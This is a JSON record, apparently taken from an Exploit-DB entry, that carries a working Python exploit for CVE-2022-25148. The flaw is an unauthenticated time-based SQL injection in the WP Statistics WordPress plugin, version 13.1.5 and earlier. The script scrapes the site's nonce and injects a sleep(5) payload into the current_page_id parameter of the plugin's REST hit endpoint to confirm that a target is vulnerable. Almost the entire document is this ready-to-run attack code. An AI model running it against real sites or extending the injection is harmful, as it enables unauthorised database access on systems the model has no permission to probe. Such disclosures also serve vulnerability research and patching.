{"source": "https://www.exploit-db.com/exploits/51711", "vulnName": "WP Statistics Plugin 13.1.5 current_page_id - Time based SQL injection (Unauthenticated)", "vulnEDBID": "51711", "vulnCVE": "2022-25148", "author": "PSYCHOSHERLOCK", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2023-09-04", "vulnContent": "# Exploit Title: WP Statistics Plugin <= 13.1.5 current_page_id - Time based SQL injection (Unauthenticated)\n# Date: 13/02/2022\n# Exploit Author: psychoSherlock\n# Vendor Homepage: https://wp-statistics.com/\n# Software Link: https://downloads.wordpress.org/plugin/wp-statistics.13.1.5.zip\n# Version: 13.1.5 and prior\n# Tested on: wp-statistics 13.1.5\n# CVE : CVE-2022-25148\n# Vendor URL: https://wordpress.org/plugins/wp-statistics/\n# CVSS Score: 8.4 (High)\n\nimport argparse\nimport requests\nimport re\nimport urllib.parse\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"CVE-2022-25148\")\n    parser.add_argument('-u', '--url', required=True,\n                        help='Wordpress base URL')\n\n    args = parser.parse_args()\n\n    baseUrl = args.url\n    payload = \"IF(1=1, sleep(5), 1)\"\n\n    wp_session = requests.session()\n\n    resp = wp_session.get(baseUrl)\n    nonce = re.search(r'_wpnonce=(.*?)&wp_statistics_hit', resp.text).group(1)\n    print(f\"Gathered Nonce: {nonce}\")\n\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15\"}\n\n    payload = urllib.parse.quote_plus(payload)\n    exploit = f'/wp-json/wp-statistics/v2/hit?_=11&_wpnonce={nonce}&wp_statistics_hit_rest=&browser=&platform=&version=&referred=&ip=11.11.11.11&exclusion_match=no&exclusion_reason&ua=Something&track_all=1&timestamp=11&current_page_type=home&current_page_id={payload}&search_query&page_uri=/&user_id=0'\n    exploit_url = baseUrl + exploit\n\n    print(f'\\nSending: {exploit_url}')\n\n    resp = wp_session.get(exploit_url, headers=headers)\n\n    if float(resp.elapsed.total_seconds()) >= 5.0:\n        print(\"\\n!!! Target is vulnerable !!!\")\n        print(f'\\nTime taken: {resp.elapsed.total_seconds()}')\n    else:\n        print('Target is not vulnerable')\n\n\nif __name__ == \"__main__\":\n    main()\n            "}